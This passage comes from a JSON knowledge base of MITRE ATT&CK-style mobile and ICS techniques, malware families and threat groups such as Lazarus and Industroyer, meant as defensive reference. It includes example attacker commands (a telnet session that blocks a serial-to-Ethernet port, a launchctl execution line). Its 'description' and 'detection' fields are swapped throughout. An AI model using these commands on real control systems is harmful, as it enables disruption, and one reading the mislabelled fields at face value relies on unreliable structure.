                "name": "Supply Chain Compromise",
                "chain_phase": "initial-access",
                "description": "* Insecure third-party libraries could be detected by application vetting techniques. For example, Google's [App Security Improvement Program](https://developer.android.com/google/play/asi) detects the use of third-party libraries with known vulnerabilities within Android apps submitted to the Google Play Store.\n* Malicious software development tools could be detected by enterprises deploying integrity checking software to the computers that they use to develop code to detect presence of unauthorized, modified software development tools.",
                "detection": "As further described in Supply Chain Compromise, supply chain compromise is the manipulation of products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise. Somewhat related, adversaries could also identify and exploit inadvertently present vulnerabilities. In many cases, it may be difficult to be certain whether exploitable functionality is due to malicious intent or simply inadvertent mistake.\n\nThird-party libraries incorporated into mobile apps could contain malicious behavior, privacy-invasive behavior, or exploitable vulnerabilities. An adversary could deliberately insert malicious behavior or could exploit inadvertent vulnerabilities. For example, security issues have previously been identified in third-party advertising libraries incorporated into apps..",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1475",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Deliver Malicious App via Authorized App Store",
                "chain_phase": "initial-access",
                "description": "* An EMM/MDM or mobile threat defense solution can identify the presence of unwanted or known insecure or malicious apps on devices.\n* Developers can scan (or have a third party scan on their behalf) the app stores for presence of unauthorized apps that were submitted using the developer's identity.",
                "detection": "Malicious applications are a common attack vector used by adversaries to gain a presence on mobile devices. Mobile devices often are configured to allow application installation only from an authorized app store (e.g., Google Play Store or Apple App Store). An adversary may seek to place a malicious application in an authorized app store, enabling the application to be installed onto targeted devices.\n\nApp stores typically require developer registration and use vetting techniques to identify malicious applications. Adversaries may use these techniques against app store defenses:\n\n* Download New Code at Runtime\n* Obfuscated Files or Information\n\nAdversaries may also seek to evade vetting by placing code in a malicious application to detect whether it is running in an app analysis environment and, if so, avoid performing malicious actions while under analysis.    \n\nAdversaries may also use fake identities, payment cards, etc., to create developer accounts to publish malicious applications to app stores. \n\nAdversaries may also use control of a target's Google account to use the Google Play Store's remote installation capability to install apps onto the Android devices associated with the Google account.   (Only applications that are available for download through the Google Play Store can be remotely installed using this technique.)",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1444",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Masquerade as Legitimate Application",
                "chain_phase": "initial-access",
                "description": "Users can detect malicious applications by watching for nuances that could indicate the application is not the intended one when it is being installed.",
                "detection": "An adversary could distribute developed malware by masquerading the malware as a legitimate application. This can be done in two different ways: by embedding the malware in a legitimate application, or by pretending to be a legitimate application.\n\nEmbedding the malware in a legitimate application is done by downloading the application, disassembling it, adding the malicious code, and then re-assembling it. The app would appear to be the original app, but would contain additional malicious functionality. The adversary could then publish the malicious application to app stores or use another delivery method.\n\nPretending to be a legitimate application relies heavily on lack of scrutinization by the user. Typically, a malicious app pretending to be a legitimate one will have many similar details as the legitimate one, such as name, icon, and description.\n\nMalicious applications may also masquerade as legitimate applications when requesting access to the accessibility service in order to appear as legitimate to the user, increasing the likelihood that the access will be granted.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1407",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Download New Code at Runtime",
                "chain_phase": "defense-evasion",
                "description": "Downloading new code at runtime can be difficult to detect, and therefore enterprises may be better served focusing on detection at other stages of adversary behavior.",
                "detection": "An app could download and execute dynamic code (not included in the original application package) after installation to evade static analysis techniques (and potentially dynamic analysis techniques) used for application vetting or application store review.\n\nOn Android, dynamic code could include native code, Dalvik code, or JavaScript code that uses the Android WebView's JavascriptInterface capability.\n\nOn iOS, techniques also exist for executing dynamic code downloaded after application installation.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "S0555",
            "type": "tool",
            "attributes": {
                "name": "CHEMISTGAMES",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "CHEMISTGAMES is a modular backdoor that has been deployed by Sandworm Team.",
                "platforms": [
                    "Android"
                ],
                "techniques": {
                    "T1605": "Command-Line Interface",
                    "T1575": "Native Code",
                    "T1533": "Data from Local System",
                    "T1521": "Standard Cryptographic Protocol",
                    "T1474": "Supply Chain Compromise",
                    "T1475": "Deliver Malicious App via Authorized App Store",
                    "T1444": "Masquerade as Legitimate Application",
                    "T1437": "Standard Application Layer Protocol",
                    "T1406": "Obfuscated Files or Information",
                    "T1426": "System Information Discovery",
                    "T1407": "Download New Code at Runtime",
                    "T1430": "Location Tracking"
                }
            },
            "val": 12
        },
        {
            "id": "T0837",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Loss of Protection",
                "chain_phase": "impact-ics",
                "description": [],
                "detection": "Adversaries may compromise protective system functions designed to prevent the effects of faults and abnormal conditions. This can result in equipment damage, prolonged process disruptions and hazards to personnel. Many faults and abnormal conditions in process control happen too quickly for a human operator to react to. Speed is critical in correcting these conditions to limit serious impacts such as Loss of Control and Property Damage. Adversaries may target and disable protective system functions as a prerequisite to subsequent attack execution or to allow for future faults and abnormal conditions to go unchecked. Detection of a Loss of Protection by operators can result in the shutdown of a process due to strict policies regarding protection systems. This can cause a Loss of Productivity and Revenue and may meet the technical goals of adversaries seeking to cause process disruptions.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T0800",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Activate Firmware Update Mode",
                "chain_phase": "inhibit-response-function",
                "description": [],
                "detection": "Adversaries may activate firmware update mode on devices to prevent expected response functions from engaging in reaction to an emergency or process malfunction. For example, devices such as protection relays may have an operation mode designed for firmware installation. This mode may halt process monitoring and related functions to allow new firmware to be loaded. A device left in update mode may be placed in an inactive holding state if no firmware is provided to it. By entering and leaving a device in this mode, the adversary may deny its usual functionalities.",
                "is_subtype": false,
                "platforms": [
                    "Field Controller/RTU/PLC/IED",
                    "Safety Instrumented System/Protection Relay"
                ]
            }
        },
        {
            "id": "T0805",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Block Serial COM",
                "chain_phase": "inhibit-response-function",
                "description": [],
                "detection": "Adversaries may block access to serial COM to prevent instructions or configurations from reaching target devices. Serial Communication ports (COM) allow communication with control system devices. Devices can receive command and configuration messages over such serial COM. Devices also use serial COM to send command and reporting messages. Blocking device serial COM may also block command messages and block reporting messages. \n\nA serial to Ethernet converter is often connected to a serial COM to facilitate communication between serial and Ethernet devices. One approach to blocking a serial COM would be to create and hold open a TCP session with the Ethernet side of the converter. A serial to Ethernet converter may have a few ports open to facilitate multiple communications. For example, if there are three serial COM available -- 1, 2 and 3 --, the converter might be listening on the corresponding ports 20001, 20002, and 20003. If a TCP/IP connection is opened with one of these ports and held open, then the port will be unavailable for use by another party. One way the adversary could achieve this would be to initiate a TCP session with the serial to Ethernet converter at <code>10.0.0.1</code> via Telnet on serial port 1 with the following command: <code>telnet 10.0.0.1 20001</code>.",
                "is_subtype": false,
                "platforms": [
                    "Field Controller/RTU/PLC/IED",
                    "Input/Output Server"
                ]
            }
        },
        {
            "id": "T0810",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Data Historian Compromise",
                "chain_phase": "initial-access-ics",
                "description": [],
                "detection": "Adversaries may compromise and gain control of a data historian to gain a foothold into the control system environment. Access to a data historian may be used to learn stored database archival and analysis information on the control system. A dual-homed data historian may provide adversaries an interface from the IT environment to the OT environment. \n\nDragos has released an updated analysis on CrashOverride that outlines the attack from the ICS network breach to payload delivery and execution.   The report summarized that CrashOverride represents a new application of malware, but relied on standard intrusion techniques. In particular, new artifacts include references to a Microsoft Windows Server 2003 host, with a SQL Server. Within the ICS environment, such a database server can act as a data historian. Dragos noted a device with this role should be \"expected to have extensive connections\" within the ICS environment. Adversary activity leveraged database capabilities to perform reconnaissance, including directory queries and network connectivity checks.\n\nPermissions Required: Administrator\n\nContributors: Joe Slowik - Dragos",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T0815",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Denial of View",
                "chain_phase": "impact-ics",
                "description": [],
                "detection": "Adversaries may cause a denial of view in attempt to disrupt and prevent operator oversight on the status of an ICS environment. This may manifest itself as a temporary communication failure between a device and its control source, where the interface recovers and becomes available once the interference ceases.    \n\nAn adversary may attempt to deny operator visibility by preventing them from receiving status and reporting messages. Denying this view may temporarily block and prevent operators from noticing a change in state or anomalous behavior. The environment's data and processes may still be operational, but functioning in an unintended or adversarial manner.\n\nIn the Maroochy attack, the adversary was able to temporarily shut an investigator out of the network, preventing them from viewing the state of the system.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T0806",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Brute Force I/O",
                "chain_phase": "impair-process-control",
                "description": [],
                "detection": "Adversaries may brute force I/O addresses on a device and attempt to exhaustively perform an action. By enumerating the full range of I/O addresses, an adversary may manipulate a process function without having to target specific I/O interfaces. More than one process function manipulation and enumeration pass may occur on the targeted I/O range in a brute force attempt.",
                "is_subtype": false,
                "platforms": [
                    "Control Server",
                    "Field Controller/RTU/PLC/IED"
                ]
            }
        },
        {
            "id": "T0831",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Manipulation of Control",
                "chain_phase": "impact-ics",
                "description": [],
                "detection": "Adversaries may manipulate physical process control within the industrial environment. Methods of manipulating control can include changes to set point values, tags, or other parameters. Adversaries may manipulate control systems devices or possibly leverage their own, to communicate with and command physical control processes. The duration of manipulation may be temporary or longer sustained, depending on operator detection. Methods of Manipulation of Control include: Man-in-the-middle, Spoof command message, Changing setpoints. A Polish student used a remote controller device to interface with the Lodz city tram system in Poland. Using this remote, the student was able to capture and replay legitimate tram signals. As a consequence, four trams were derailed and twelve people injured due to resulting emergency stops.Using this remote, the student was able to capture and replay legitimate tram signals. As a consequence, four trams were derailed and twelve people injured due to resulting emergency stops. The track controlling commands issued may have also resulted in tram collisions, a further risk to those on board and nearby the areas of impact.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T0840",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Network Connection Enumeration",
                "chain_phase": "discovery-ics",
                "description": [],
                "detection": "Adversaries may perform network connection enumeration to discover information about device communication patterns. If an adversary can inspect the state of a network connection with tools, such as https://en.wikipedia.org/wiki/Netstat netstat, in conjunction with <span class=\"smw-format list-format \"><span class=\"smw-row\"><span class=\"smw-field\"><span class=\"smw-value\">System Firmware</span></span></span></span>, then they can determine the role of certain devices on the network  . The adversary can also use Network Sniffing to watch network traffic for details about the source, destination, protocol, and content.",
                "is_subtype": false,
                "platforms": [
                    "Human-Machine Interface"
                ]
            }
        },
        {
            "id": "T0803",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Block Command Message",
                "chain_phase": "inhibit-response-function",
                "description": [],
                "detection": "Adversaries may block a command message from reaching its intended target to prevent command execution. In OT networks, command messages are sent to provide instructions to control system devices. A blocked command message can inhibit response functions from correcting a disruption or unsafe condition.",
                "is_subtype": false,
                "platforms": [
                    "Field Controller/RTU/PLC/IED"
                ]
            }
        },
        {
            "id": "T0813",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Denial of Control",
                "chain_phase": "impact-ics",
                "description": [],
                "detection": "Adversaries may cause a denial of control to temporarily prevent operators and engineers from interacting with process controls. An adversary may attempt to deny process control access to cause a temporary loss of communication with the control device or to prevent operator adjustment of process controls. An affected process may still be operating during the period of control loss, but not necessarily in a desired state.   \n\nIn the Maroochy attack, the adversary was able to temporarily shut an investigator out of the network preventing them from issuing any controls. In the 2017 Dallas Siren incident operators were unable to disable the false alarms from the Office of Emergency Management headquarters.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T0816",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Device Restart/Shutdown",
                "chain_phase": "inhibit-response-function",
                "description": [],
                "detection": "Adversaries may forcibly restart or shutdown a device in an ICS environment to disrupt and potentially negatively impact physical processes. Methods of device restart and shutdown exist in some devices as built-in, standard functionalities. These functionalities can be executed using interactive device web interfaces, CLIs, and network protocol commands. Unexpected restart or shutdown of control system devices may prevent expected response functions happening during critical states. A device restart can also be a sign of malicious device modifications, as many updates require a shutdown in order to take effect.",
                "is_subtype": false,
                "platforms": [
                    "Field Controller/RTU/PLC/IED"
                ]
            }
        },
        {
            "id": "T0832",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Manipulation of View",
                "chain_phase": "impact-ics",
                "description": [],
                "detection": "Adversaries may attempt to manipulate the information reported back to operators or controllers. This manipulation may be short term or sustained. During this time the process itself could be in a much different state than what is reported.    \n\nOperators may be fooled into doing something that is harmful to the system in a loss of view situation. With a manipulated view into the systems, operators may issue inappropriate control sequences that introduce faults or catastrophic failures into the system. Business analysis systems can also be provided with inaccurate data leading to bad management decisions.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Engineering Workstation",
                    "Human-Machine Interface"
                ]
            }
        },
        {
            "id": "T0804",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Block Reporting Message",
                "chain_phase": "inhibit-response-function",
                "description": [],
                "detection": "Adversaries may block or prevent a reporting message from reaching its intended target. In control systems, reporting messages contain telemetry data (e.g., I/O values) pertaining to the current state of equipment and the industrial process. By blocking these reporting messages, an adversary can potentially hide their actions from an operator. Blocking reporting messages in control systems that manage physical processes may contribute to system impact, causing inhibition of a response function. A control system may not be able to respond in a proper or timely manner to an event, such as a dangerous fault, if its corresponding reporting message is blocked.",
                "is_subtype": false,
                "platforms": [
                    "Field Controller/RTU/PLC/IED",
                    "Input/Output Server"
                ]
            }
        },
        {
            "id": "T0807",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Command-Line Interface",
                "chain_phase": "execution-ics",
                "description": [],
                "detection": "Adversaries may utilize command-line interfaces (CLIs) to interact with systems and execute commands. CLIs provide a means of interacting with computer systems and are a common feature across many types of platforms and devices within control systems environments.  Adversaries may also use CLIs to install and run new software, including malicious tools that may be installed over the course of an operation.\n\nCLIs are typically accessed locally, but can also be exposed via services, such as SSH, Telnet, and RDP.  Commands that are executed in the CLI execute with the current permissions level of the process running the terminal emulator, unless the command specifies a change in permissions context.\n\nMany controllers have CLI interfaces for management purposes.\n\nDetection: Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T0809",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Data Destruction",
                "chain_phase": "inhibit-response-function",
                "description": [],
                "detection": "Adversaries may perform data destruction over the course of an operation. The adversary may drop or create malware, tools, or other non-native files on a target system to accomplish this, potentially leaving behind traces of malicious activities. Such non-native files and other data may be removed over the course of an intrusion to maintain a small footprint or as a standard part of the post-intrusion cleanup process.  \n\nData destruction may also be used to render operator interfaces unable to respond and to disrupt response functions from occurring as expected. An adversary may also destroy data backups that are vital to recovery after an incident.\n\nStandard file deletion commands are available on most operating system and device interfaces to perform cleanup, but adversaries may use other tools as well. Two examples are Windows Sysinternals SDelete and Active@ Killdisk.\n\nDetection: It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.",
                "is_subtype": false,
                "platforms": [
                    "Control Server",
                    "Human-Machine Interface",
                    "Field Controller/RTU/PLC/IED"
                ]
            }
        },
        {
            "id": "S1004",
            "type": "tool",
            "attributes": {
                "name": "Industroyer",
                "aliases": [
                    "CRASHOVERRIDE"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Industroyer is a sophisticated piece of malware designed to cause an Impact to the working processes of Industrial Control Systems (ICS), specifically ICSs used in electrical substations. Industroyer was alleged to be used in the attacks on the Ukrainian power grid in December 2016.)",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T0888": "Remote System Information Discovery",
                    "T0837": "Loss of Protection",
                    "T0800": "Activate Firmware Update Mode",
                    "T0805": "Block Serial COM",
                    "T0810": "Data Historian Compromise",
                    "T0815": "Denial of View",
                    "T0827": "Loss of Control",
                    "T0806": "Brute Force I/O",
                    "T0802": "Automated Collection",
                    "T0831": "Manipulation of Control",
                    "T0840": "Network Connection Enumeration",
                    "T0881": "Service Stop",
                    "T0803": "Block Command Message",
                    "T0813": "Denial of Control",
                    "T0816": "Device Restart/Shutdown",
                    "T0880": "Loss of Safety",
                    "T0832": "Manipulation of View",
                    "T0846": "Remote System Discovery",
                    "T0804": "Block Reporting Message",
                    "T0807": "Command-Line Interface",
                    "T0809": "Data Destruction",
                    "T0814": "Denial of Service",
                    "T0829": "Loss of View",
                    "T0849": "Masquerading",
                    "T0855": "Unauthorized Command Message"
                }
            },
            "val": 25
        },
        {
            "id": "S1005",
            "type": "tool",
            "attributes": {
                "name": "Killdisk",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "In 2015 the BlackEnergy malware contained a component called KillDisk. KillDisk's main functionality is to overwrite files with random data, rendering the OS unbootable.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T0872": "Indicator Removal on Host",
                    "T0881": "Service Stop",
                    "T0809": "Data Destruction",
                    "T0829": "Loss of View"
                }
            },
            "val": 4
        },
        {
            "id": "G0033",
            "type": "group",
            "attributes": {
                "val": 0,
                "name": "Poseidon Group",
                "aliases": [],
                "description": "Poseidon Group is a Portuguese-speaking threat group that has been active since at least 2005. The group has a history of using information exfiltrated from victims to blackmail victim companies into contracting the Poseidon Group as a security firm.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": [],
                "techniques": {
                    "T1059.001": "PowerShell",
                    "T1087.002": "Domain Account",
                    "T1087.001": "Local Account",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1007": "System Service Discovery",
                    "T1003": "OS Credential Dumping"
                }
            }
        },
        {
            "id": "G0032",
            "type": "group",
            "attributes": {
                "val": 23,
                "name": "Lazarus Group",
                "aliases": [
                    "HIDDEN COBRA",
                    "Guardians of Peace",
                    "ZINC",
                    "NICKEL ACADEMY"
                ],
                "description": "Lazarus Group is a threat group that has been attributed to the North Korean government. The group has been active since at least 2009 and was reportedly responsible for the November 2014 destructive wiper attack against Sony Pictures Entertainment as part of a campaign named Operation Blockbuster by Novetta. Malware used by Lazarus Group correlates to other reported campaigns, including Operation Flame, Operation 1Mission, Operation Troy, DarkSeoul, and Ten Days of Rain.  In late 2017, Lazarus Group used KillDisk, a disk-wiping tool, in an attack against an online casino based in Central America. \n\nNorth Korean group definitions are known to have significant overlap, and the name Lazarus Group is known to encompass a broad range of activity. Some organizations use the name Lazarus Group to refer to any activity attributed to North Korea. Some organizations track North Korean clusters or groups such as Bluenoroff, APT37, and APT38 separately, while other organizations may track some activity associated with those group names by the name Lazarus Group.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0593": "ECCENTRICBANDWAGON",
                    "S0586": "TAINTEDSCRIBE",
                    "S0584": "AppleJeus",
                    "S0567": "Dtrack",
                    "S0520": "BLINDINGCAN",
                    "S0498": "Cryptoistic",
                    "S0497": "Dacls",
                    "S0431": "HotCroissant",
                    "S0376": "HOPLIGHT",
                    "S0366": "WannaCry",
                    "S0364": "RawDisk",
                    "S0347": "AuditCred",
                    "S0245": "BADCALL",
                    "S0246": "HARDRAIN",
                    "S0241": "RATANKBA",
                    "S0239": "Bankshot",
                    "S0271": "KEYMARBLE",
                    "S0238": "Proxysvc",
                    "S0263": "TYPEFRAME",
                    "S0180": "Volgmer",
                    "S0181": "FALLCHILL",
                    "S0108": "netsh",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1588.004": "Digital Certificates",
                    "T1587.001": "Malware",
                    "T1583.006": "Web Services",
                    "T1583.001": "Domains",
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1048.003": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
                    "T1001.003": "Protocol Impersonation",
                    "T1132.001": "Standard Encoding",
                    "T1090.002": "External Proxy",
                    "T1571": "Non-Standard Port",
                    "T1074.001": "Local Data Staging",
                    "T1204.002": "Malicious File",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.003": "Spearphishing via Service",
                    "T1566.001": "Spearphishing Attachment",
                    "T1564.001": "Hidden Files and Directories",
                    "T1562.004": "Disable or Modify System Firewall",
                    "T1562.001": "Disable or Modify Tools",
                    "T1561.002": "Disk Structure Wipe",
                    "T1561.001": "Disk Content Wipe",
                    "T1560.003": "Archive via Custom Method",
                    "T1560.002": "Archive via Library",
                    "T1560": "Archive Collected Data",
                    "T1491.001": "Internal Defacement",
                    "T1134.002": "Create Process with Token",
                    "T1056.001": "Keylogging",
                    "T1003.001": "LSASS Memory",
                    "T1110.003": "Password Spraying",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1036.004": "Masquerade Task or Service",
                    "T1027.002": "Software Packing",
                    "T1070.006": "Timestomp",
                    "T1070.004": "File Deletion",
                    "T1547.009": "Shortcut Modification",
                    "T1547.005": "Security Support Provider",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.005": "Mshta",
                    "T1218.001": "Compiled HTML File",
                    "T1543.003": "Windows Service",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1542.003": "Bootkit",
                    "T1529": "System Shutdown/Reboot",
                    "T1496": "Resource Hijacking",
                    "T1489": "Service Stop",
                    "T1485": "Data Destruction",
                    "T1189": "Drive-by Compromise",
                    "T1203": "Exploitation for Client Execution",
                    "T1124": "System Time Discovery",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1098": "Account Manipulation",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1065": "Uncommonly Used Port",
                    "T1057": "Process Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1043": "Commonly Used Port",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1026": "Multiband Communication",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry",
                    "T1010": "Application Window Discovery",
                    "T1008": "Fallback Channels",
                    "T1005": "Data from Local System",
                    "T0865": "Spearphishing Attachment"
                }
            }
        },
        {
            "id": "S0593",
            "type": "tool",
            "attributes": {
                "name": "ECCENTRICBANDWAGON",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "ECCENTRICBANDWAGON is a Remote Access Tool (RAT) used by Lazarus Group that was first identified in August 2020. It is a reconnaissance tool--with keylogging and screen capture functionality--used for information gathering on compromised systems.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1074.001": "Local Data Staging",
                    "T1059.003": "Windows Command Shell",
                    "T1056.001": "Keylogging",
                    "T1070.004": "File Deletion",
                    "T1113": "Screen Capture",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 6
        },
        {
            "id": "S0586",
            "type": "tool",
            "attributes": {
                "name": "TAINTEDSCRIBE",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "TAINTEDSCRIBE is a fully-featured beaconing implant integrated with command modules used by Lazarus Group. It was first reported in May 2020.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1001.003": "Protocol Impersonation",
                    "T1059.003": "Windows Command Shell",
                    "T1560": "Archive Collected Data",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1027.001": "Binary Padding",
                    "T1070.006": "Timestomp",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1124": "System Time Discovery",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1018": "Remote System Discovery",
                    "T1008": "Fallback Channels"
                }
            },
            "val": 16
        },
        {
            "id": "T1569.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Launchctl",
                "chain_phase": "execution",
                "description": "KnockKnock can be used to detect persistent programs such as those installed via launchctl as launch agents or launch daemons. Additionally, every launch agent or launch daemon must have a corresponding plist file on disk which can be monitored. Monitor process execution from launchctl/launchd for unusual or unknown processes.",
                "detection": "Adversaries may abuse launchctl to execute commands or programs. Launchctl controls the macOS launchd process, which handles things like Launch Agents and Launch Daemons, but can execute other commands or programs itself. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.\n\nBy loading or reloading Launch Agents or Launch Daemons, adversaries can install persistence or execute changes they made.\n\nRunning a command from launchctl is as simple as <code>launchctl submit -l <labelName> -- /Path/to/thing/to/execute \"arg\" \"arg\" \"arg\"</code>. Adversaries can abuse this functionality to execute code or even bypass application control if launchctl is an allowed process.",
                "is_subtype": true,
                "platforms": [
                    "macOS"
                ]
            }
        },
        {
            "id": "S0584",
            "type": "tool",
            "attributes": {
                "name": "AppleJeus",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "AppleJeus is a family of downloaders initially discovered in 2018 embedded within trojanized cryptocurrency applications. AppleJeus has been used by Lazarus Group, targeting companies in the energy, finance, government, industry, technology, and telecommunications sectors, and several countries including the United States, United Kingdom, South Korea, Australia, Brazil, New Zealand, and Russia. AppleJeus has been used to distribute the FALLCHILL RAT.",
                "platforms": [
                    "Windows",
                    "macOS"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1569.001": "Launchctl",
                    "T1059.004": "Unix Shell",
                    "T1497.003": "Time Based Evasion",
                    "T1566.002": "Spearphishing Link",
                    "T1564.001": "Hidden Files and Directories",
                    "T1553.002": "Code Signing",
                    "T1070.004": "File Deletion",
                    "T1548.002": "Bypass User Account Control",
                    "T1218.007": "Msiexec",
                    "T1543.004": "Launch Daemon",
                    "T1543.003": "Windows Service",
                    "T1053.005": "Scheduled Task",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1082": "System Information Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 19
        },
        {
            "id": "T1547",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Boot or Logon Autostart Execution",
                "chain_phase": "persistence",
                "description": "Monitor for additions or modifications of mechanisms that could be used to trigger autostart execution, such as relevant additions to the Registry. Look for changes that are not correlated with known updates, patches, or other planned administrative activity. Tools such as Sysinternals Autoruns may also be used to detect system autostart configuration changes that could be attempts at persistence.(Citation: TechNet Autoruns)  Changes to some autostart configuration settings may happen under normal conditions when legitimate software is installed. \n\nSuspicious program execution as autostart programs may show up as outlier processes that have not been seen before when compared against historical data.To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\nMonitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL.\n\nMonitor for abnormal usage of utilities and command-line parameters involved in kernel modification or driver installation.",
                "detection": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.  These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\n\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1078",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Valid Accounts",
                "chain_phase": "defense-evasion",
                "description": "Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services. (Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence. Checks on these accounts could also include whether default accounts such as Guest have been activated. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.",
                "detection": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
